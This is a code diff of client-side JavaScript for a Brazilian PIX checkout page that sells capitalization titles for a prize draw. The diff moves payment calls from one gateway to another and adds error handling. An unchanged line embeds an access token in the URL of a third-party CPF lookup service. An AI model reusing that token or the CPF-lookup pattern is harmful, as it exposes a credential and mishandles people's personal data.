@@ -1635,11 +1635,39 @@
         taxaPaga: false
     };
 
-    const ALLOWPAY_CONFIG = {
-        API_URL: '/api/allowpay',
+    const BLUEPAG_CONFIG = {
+        API_URL: '/api/bluepag-pix',
         CHECK_PAYMENT_URL: '/api/check-payment',
-        CHECK_CONFIRMED_URL: '/api/check-confirmed'
+        CHECK_CONFIRMED_URL: '/api/check-payment'
     };
+
+    function mensagemErroPIX(value, fallback = 'Não foi possível gerar o PIX.') {
+        if (typeof value === 'string' && value.trim()) return value;
+        if (value && typeof value === 'object') {
+            for (const key of ['message', 'error', 'detail', 'description', 'mensagem']) {
+                if (value[key] != null && value[key] !== value) {
+                    const msg = mensagemErroPIX(value[key], '');
+                    if (msg) return msg;
+                }
+            }
+            if (Array.isArray(value.errors)) {
+                const msgs = value.errors.map(x => mensagemErroPIX(x, '')).filter(Boolean);
+                if (msgs.length) return msgs.join('; ');
+            }
+        }
+        return fallback;
+    }
+
+    async function lerRespostaPIX(response) {
+        const raw = await response.text();
+        let result;
+        try { result = JSON.parse(raw); }
+        catch { throw new Error(`Servidor retornou resposta inválida (HTTP ${response.status}).`); }
+        if (!response.ok || !result || result.success !== true) {
+            throw new Error(mensagemErroPIX(result?.error ?? result?.message ?? result, `Falha ao gerar PIX (HTTP ${response.status}).`));
+        }
+        return result;
+    }
 
     const CPF_API_URL = 'https://api.amnesiatecnologia.lat/?token=4c80cd47-d9d5-4672-a301-b9b8741fc293&cpf=';
 
@@ -2101,6 +2129,8 @@ function irParaWhatsApp(){
             return;
         }
         
+        // A API preenche o e-mail técnico no servidor; o cliente não precisa informá-lo.
+        dadosUsuario.email = '';
         dadosUsuario.telefone = telefoneNumeros;
         erroTelefone.style.display = 'none';
         telefoneInput.style.borderColor = '#28a745';
@@ -2111,24 +2141,22 @@ function irParaWhatsApp(){
         
         try {
             const nomeProduto = `Título de Capitalização`;
-            const emailTemp = null;
             
             const dadosPIX = {
                 amount: pacoteSelecionado.valor,
                 cpf: dadosUsuario.cpf,
                 nome: dadosUsuario.nome,
+                email: dadosUsuario.email,
                 data_nascimento: dadosUsuario.data_nascimento,
                 telefone: telefoneNumeros,
                 quantidade: pacoteSelecionado.quantidade,
-                produto: nomeProduto,
-                email: emailTemp
+                produto: nomeProduto
             };
             
             // Dados pessoais não são registrados no console.
             console.log('🔑 Nome do produto enviado:', nomeProduto);
-            // O e-mail técnico é criado apenas no backend.
             
-            const response = await fetch(ALLOWPAY_CONFIG.API_URL, {
+            const response = await fetch(BLUEPAG_CONFIG.API_URL, {
                 method: 'POST',
                 headers: {
                     'Content-Type': 'application/json',
@@ -2137,12 +2165,7 @@ function irParaWhatsApp(){
                 body: JSON.stringify(dadosPIX)
             });
             
-            const resultado = await response.json();
-            // Resposta de pagamento processada.
-            
-            if (!resultado.success) {
-                throw new Error(resultado.error || 'Erro ao gerar PIX');
-            }
+            const resultado = await lerRespostaPIX(response);
             
             const qrCodeImage = resultado.qr_code_image || 
                 `https://api.qrserver.com/v1/create-qr-code/?size=200x200&data=${encodeURIComponent(resultado.codigo_pix || resultado.qr_code)}`;
@@ -2181,12 +2204,12 @@ function irParaWhatsApp(){
                 ...resultado,
                 cpf: dadosUsuario.cpf,
                 nome: dadosUsuario.nome,
+                email: dadosUsuario.email,
                 data_nascimento: dadosUsuario.data_nascimento,
                 telefone: dadosUsuario.telefone,
                 quantidade: pacoteSelecionado.quantidade,
                 valor: pacoteSelecionado.valor,
                 produto: nomeProduto,
-                email: emailTemp,
                 gerado_em: new Date().toISOString(),
                 status: 'pending'
             })); } catch(e) { console.warn('Não foi possível salvar o PIX localmente:',e); }
@@ -2199,7 +2222,7 @@ function irParaWhatsApp(){
             console.error('❌ Erro:', error);
             
             const areaErro = document.getElementById('erroTelefone');
-            areaErro.textContent = `Erro: ${error.message}. Verifique sua conexão ou tente novamente.`;
+            areaErro.textContent = `Erro: ${mensagemErroPIX(error?.message || error)}. Tente novamente ou confira os dados.`;
             areaErro.style.display = 'block';
             
             btnGerarPIX.innerHTML = 'Gerar PIX para pagamento';
@@ -2253,14 +2276,14 @@ function irParaWhatsApp(){
         
         consultaPixEmAndamento = true;
         try {
-            const response = await fetch(ALLOWPAY_CONFIG.CHECK_PAYMENT_URL, {
+            const response = await fetch(BLUEPAG_CONFIG.CHECK_PAYMENT_URL, {
                 method: 'POST',
                 headers: {
                     'Content-Type': 'application/json'
                 },
                 body: JSON.stringify({
                     transaction_id: dadosUsuario.transactionId,
-                    route: dadosUsuario.pixData?.route || 'pagou'
+                    route: 'bluepag'
                 })
             });
             
@@ -2272,9 +2295,9 @@ function irParaWhatsApp(){
             }
             
             const status = result.status;
-            const allowpayStatus = result.allowpay_status;
+            const bluepagStatus = result.status;
             
-            console.log(`📊 Status do pagamento: ${allowpayStatus}`);
+            console.log(`📊 Status do pagamento: ${bluepagStatus}`);
             
             const statusConfirmados = ['paid', 'completed', 'approved'];
             
@@ -2289,7 +2312,7 @@ function irParaWhatsApp(){
                 processarConfirmacao({
                     confirmado: true,
                     status: status,
-                    allowpay_status: allowpayStatus,
+                    bluepag_status: bluepagStatus,
                     amount: result.amount,
                     data: result.response_data
                 });
@@ -2352,7 +2375,7 @@ function irParaWhatsApp(){
             localStorage.setItem(chave, JSON.stringify(registro));
             salvarConfirmacaoPagamento();
         } catch (e) { console.warn('Falha no armazenamento local (pagamento confirmado na API):', e); }
-        fetch('/api/fichas',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({action:'pago',transaction_id:dadosUsuario.transactionId,route:dadosUsuario.pixData?.route||'pagou'})}).catch(()=>{});
+        fetch('/api/fichas',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({action:'pago',transaction_id:dadosUsuario.transactionId,route:'bluepag'})}).catch(()=>{});
         try { enviarEventoConversao(pacoteSelecionado.valor, pacoteSelecionado.quantidade, dadosUsuario.transactionId); }
         catch (e) { console.warn('Evento de conversão indisponível:', e); }
         const id = document.getElementById('transacaoId');
@@ -2525,15 +2548,16 @@ function irParaWhatsApp(){
                 amount: valorTaxa,
                 cpf: dadosUsuario.cpf,
                 nome: dadosUsuario.nome,
+                email: dadosUsuario.email,
                 data_nascimento: dadosUsuario.data_nascimento,
                 telefone: dadosUsuario.telefone,
                 quantidade: 1,
                 descricao: 'Oferta promocional - 200 títulos extras - sorteio de domingo'
             };
             
-            console.log('Gerando PIX da oferta');
+            // Não registrar dados pessoais do pagador no console.
             
-            const response = await fetch(ALLOWPAY_CONFIG.API_URL, {
+            const response = await fetch(BLUEPAG_CONFIG.API_URL, {
                 method: 'POST',
                 headers: {
                     'Content-Type': 'application/json',
@@ -2542,12 +2566,7 @@ function irParaWhatsApp(){
                 body: JSON.stringify(dadosPIX)
             });
             
-            const resultado = await response.json();
-            console.log('Resposta da oferta recebida:', Boolean(resultado.success));
-            
-            if (!resultado.success) {
-                throw new Error(resultado.error || 'Erro ao gerar PIX da oferta');
-            }
+            const resultado = await lerRespostaPIX(response);
             
             const qrCodeImage = resultado.qr_code_image || 
                 `https://api.qrserver.com/v1/create-qr-code/?size=200x200&data=${encodeURIComponent(resultado.codigo_pix || resultado.qr_code)}`;
@@ -2634,7 +2653,7 @@ function irParaWhatsApp(){
         document.getElementById('statusTaxa').textContent = `Verificando pagamento...`;
         
         try {
-            const response = await fetch(ALLOWPAY_CONFIG.CHECK_PAYMENT_URL, {
+            const response = await fetch(BLUEPAG_CONFIG.CHECK_PAYMENT_URL, {
                 method: 'POST',
                 headers: {
                     'Content-Type': 'application/json'
